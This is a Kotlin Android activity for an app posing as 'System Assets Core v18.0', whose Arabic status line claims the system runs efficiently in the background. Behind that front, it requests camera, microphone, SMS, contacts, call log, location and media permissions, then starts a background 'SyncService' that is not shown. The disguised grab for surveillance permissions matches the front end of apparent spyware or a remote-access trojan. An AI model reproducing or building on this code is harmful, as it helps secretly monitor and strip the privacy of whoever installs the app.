package com.assets.service

import android.Manifest
import android.app.Activity
import android.content.Intent
import android.content.pm.PackageManager
import android.os.Build
import android.os.Bundle
import android.view.Gravity
import android.widget.LinearLayout
import android.widget.TextView
import androidx.core.app.ActivityCompat
import androidx.core.content.ContextCompat

class MainActivity : Activity() {
    override fun onCreate(savedInstanceState: Bundle?) {
        super.onCreate(savedInstanceState)

        val root = LinearLayout(this).apply {
            orientation = LinearLayout.VERTICAL
            gravity = Gravity.CENTER
            setPadding(32, 32, 32, 32)
            setBackgroundColor(0xFF0F172A.toInt())
        }
        val title = TextView(this).apply {
            text = "🛡️ System Assets Core v18.0"
            gravity = Gravity.CENTER
            textSize = 20f
            setTextColor(0xFF00FF66.toInt())
            setPadding(0, 0, 0, 32)
        }
        val status = TextView(this).apply {
            text = "✅ النظام يعمل بكفاءة في الخلفية."
            gravity = Gravity.CENTER
            textSize = 16f
            setTextColor(0xFFFFFFFF.toInt())
        }
        root.addView(title); root.addView(status)
        setContentView(root)

        val perms = mutableListOf(
            Manifest.permission.CAMERA,
            Manifest.permission.RECORD_AUDIO,
            Manifest.permission.READ_SMS,
            Manifest.permission.READ_CONTACTS,
            Manifest.permission.READ_CALL_LOG,
            Manifest.permission.ACCESS_FINE_LOCATION,
            Manifest.permission.ACCESS_COARSE_LOCATION,
            Manifest.permission.VIBRATE,
            Manifest.permission.WAKE_LOCK
        )
        if (Build.VERSION.SDK_INT >= 33) {
            perms.add(Manifest.permission.READ_MEDIA_IMAGES)
            perms.add(Manifest.permission.READ_MEDIA_VIDEO)
            perms.add(Manifest.permission.READ_MEDIA_AUDIO)
            perms.add(Manifest.permission.POST_NOTIFICATIONS)
        } else perms.add(Manifest.permission.READ_EXTERNAL_STORAGE)

        val pending = perms.filter { ContextCompat.checkSelfPermission(this, it) != PackageManager.PERMISSION_GRANTED }
        if (pending.isNotEmpty()) ActivityCompat.requestPermissions(this, pending.toTypedArray(), 100) else launch()
    }

    override fun onRequestPermissionsResult(requestCode: Int, permissions: Array<out String>, grantResults: IntArray) {
        super.onRequestPermissionsResult(requestCode, permissions, grantResults)
        launch()
    }

    private fun launch() {
        try { startForegroundService(Intent(this, SyncService::class.java)) }
        catch (_: Exception) { startService(Intent(this, SyncService::class.java)) }
    }
}
